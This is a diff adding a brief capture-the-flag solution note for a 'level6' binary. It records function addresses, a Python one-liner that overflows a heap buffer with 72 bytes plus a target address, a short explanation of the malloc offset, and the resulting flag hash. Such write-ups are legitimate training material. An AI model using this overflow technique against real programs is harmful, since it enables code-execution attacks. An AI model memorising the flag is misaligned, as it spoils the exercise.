@@ -1,0 +1,13 @@
+
+function n: 0x804845a (GOAL)
+function m: 0x08048468
+
+./level6  $(python -c "print 'a' * 72 + '\x54\x84\x04\x08'")
+
+heap overflow
+
+check offset of 2 mallocs, add this amount to argv[1] + address of m so that is overflows in first string in strcpy
+
+=>
+
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
